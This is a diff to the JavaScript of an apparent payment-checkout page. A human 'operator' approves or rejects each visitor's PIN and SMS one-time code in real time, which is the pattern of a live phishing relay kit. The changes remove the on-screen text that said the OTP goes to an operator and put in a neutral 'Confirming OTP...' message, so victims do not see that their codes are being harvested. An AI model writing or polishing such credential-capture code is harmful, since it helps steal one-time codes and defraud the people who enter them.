@@ -9,9 +9,9 @@
    * Background watchdog polls pin-status every 2s. If the operator
      rejects the PIN while the user is here, we bounce them back to
      checkout.html?plan=X&sid=Y&phone=Z&error=pin_rejected.
-   * Next Step: POST /api/otp, show the approval loader, then poll
-     otp-status until approved (-> success.html) or rejected (-> show
-     inline error, allow retry).
+   * Next Step: POST /api/otp, show a single "Confirming OTP..."
+     loader, then poll otp-status until approved (-> success.html) or
+     rejected (-> show inline error, allow retry).
    ========================================================================== */
 
 (function (global) {
@@ -27,6 +27,10 @@
   var LOADER_BODY_ID = "sms-loader-body";
   var ERROR_ID = "sms-error";
   var ERROR_TEXT_ID = "sms-error-text";
+
+  var LOADER_TITLE = "Confirming OTP...";
+  var LOADER_BODY =
+    "Please wait while we verify your confirmation message.";
 
   var ERROR_OTP_REJECTED =
     "Invalid confirmation message, please wait for a new one and try again.";
@@ -200,17 +204,13 @@
       if (!smsBody) {
         return;
       }
-      showLoader("Sending OTP...", "Sending your OTP to the operator");
+      showLoader(LOADER_TITLE, LOADER_BODY);
       postOtp(smsBody).then(function (response) {
         if (!response.ok) {
           hideLoader();
           showError(ERROR_NETWORK);
           return;
         }
-        showLoader(
-          "Awaiting Approval...",
-          "Waiting for the operator to verify the OTP. Please do not close this page."
-        );
         pollOtpStatus();
       }).catch(function () {
         hideLoader();
